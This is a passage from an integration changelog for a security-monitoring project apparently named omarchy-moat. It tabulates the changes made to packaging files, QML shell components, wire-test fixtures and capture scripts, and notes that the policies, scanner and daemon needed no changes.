| `pkg/PKGBUILD` | ship `omarchy-default.toml` (+`backup=`), the two user digest units, `BASELINE.md` and `LEARNING-AND-ANALYSIS.md`; comment the incidents tmpfiles entry |
| `pkg/omarchy-moat.install` | digest timer in `post_install` and `pre_remove`; the ordered restart caveat in `post_upgrade` |
| `pkg/README.md` | the four paths CONTRACT §2 does not list, the digest step, the ordered restart |
| `shell/MoatModel.js` | P1 allowlist `source`/`removable`/`sourceName`/`shipped` + three sections, P2 `incident` in `UPDATABLE`, P3 `if_expected.other` + `otherOptions()`, P4 unwrapped receipts + `receiptsFromResponse()`, P5 the NUL byte |
| `shell/AllowlistView.qml` | P1 SHIPPED section, `removeRequested(index, file)` |
| `shell/Panel.qml` | P1 carry the fragment through the confirm |
| `shell/Service.qml` | P1 `unignore --file`, P3 expose `otherOptions` |
| `shell/AlertDetail.qml` | P3 render the non-ignore options with their commands |
| `shell/tests/tst_wire.qml` | rewritten — 36 wire tests over the new capture |
| `shell/tests/fixtures/wire/*` | regenerated, 14 files |
| `shell/tests/capture-wire-fixtures.sh` | new — regenerates the fixtures from a real daemon |
| `shell/tests/gen-export-log.py` | new — the synthetic Tetragon export it replays |
| `shell/tests/run-tests.sh`, `shell/README.md` | point at the capture script; document the wire suite and the SHIPPED section |
| `sandbox/tests/run.sh` | S1 |
| `tests/run-all.sh` | T1 |
| `docs/CONTRACT.md` | C1 |
| `docs/INTEGRATION.md` | this file |

`policies/`, `scanner/`, `moatd/src/` and `moatd/etc/` needed no changes: every
mismatch this pass found was on the cheaper side of the seam, and the daemon
violated neither BASELINE §8 nor LEARNING §9.
